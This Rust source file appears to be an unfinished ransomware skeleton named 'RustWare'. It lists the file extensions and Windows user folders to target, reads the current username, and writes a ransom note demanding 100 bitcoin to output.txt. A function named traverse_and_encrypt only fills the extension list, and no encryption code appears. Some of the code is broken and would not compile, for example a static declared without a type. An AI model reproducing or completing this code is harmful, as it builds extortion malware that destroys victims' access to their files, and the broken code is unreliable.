use std::ptr;
use std::env;
use std::time::Duration;
use std::thread::sleep;
use std::fs::File;
use std::io::{BufWriter, Write};


use windows_sys::{
    core::*, Win32::Foundation::*, Win32::System::Threading::*, Win32::System::WindowsProgramming::*,
};


static mut VALID_EXTENSION_VEC: Vec<&str> = Vec::new();
pub fn traverse_and_encrypt() {
    unsafe {
        let ext = [
            ".pl", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".d3dbsp", ".sc2save", ".sie",
            ".sum", ".bkp", ".flv", ".js", ".raw", ".jpeg", ".tar", ".zip", ".tar.gz", ".cmd",
            ".key", ".DOT", ".docm", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
            ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx",
            ".html", ".xml", ".psd", ".bmp", ".pdf", ".py", ".rtf",
        ];

        // push all valid extension into VALID_EXTENSION_VEC
        for each in ext.iter() {
            VALID_EXTENSION_VEC.push(each.clone());
        }
    }
}



 static dir_names = [
        "Contacts",
        "Desktop",
        "Documents",
        "Downloads",
        "Favorites",
        "Music",
        "OneDrive\\Attachments",
        "OneDrive\\Desktop",
        "OneDrive\\Documents",
        "OneDrive\\Pictures",
        "OneDrive\\Music",
        "Pictures",
        "Videos",
    ];






fn get_username_name() -> String{
unsafe {
        let mut size = 0;
        let retval = GetUserNameA(ptr::null_mut(), &mut size);
        assert_eq!(retval, 0, "Should have failed");

        let mut username = Vec::with_capacity(size as usize);
        let retval = GetUserNameA(username.as_mut_ptr(), &mut size);
        assert_ne!(retval, 0, "Perform better error handling");
        assert!((size as usize) <= username.capacity());
        username.set_len(size as usize);
        username.resize((size - 1) as usize, 0u8);

        // Beware: This leaves the trailing NUL character in the final string,
        // you may want to remove it!
        String::from_utf8(username).unwrap()
    }

}





fn main()-> std::io::Result<()> {
println!("Hello, world!");
let dir = env::current_dir().unwrap();

println!("{}",dir.display());
let time = Duration::from_secs(3);
let file = File::create("output.txt")?;

    // Create a buffered writer to write to the file
let mut writer = BufWriter::new(file);

    // Write some data to the file
    writer.write_all(b"Hello this is RustWare\n")?;
    writer.write_all(b"Pay 100 bitcoint to this wallet to unlock files.\n")?;

    // Flush the writer to ensure all data is written to disk
    writer.flush()?;
    println!("{:?}", get_username_name());
    // sleep
    sleep(time);
Ok(())
}
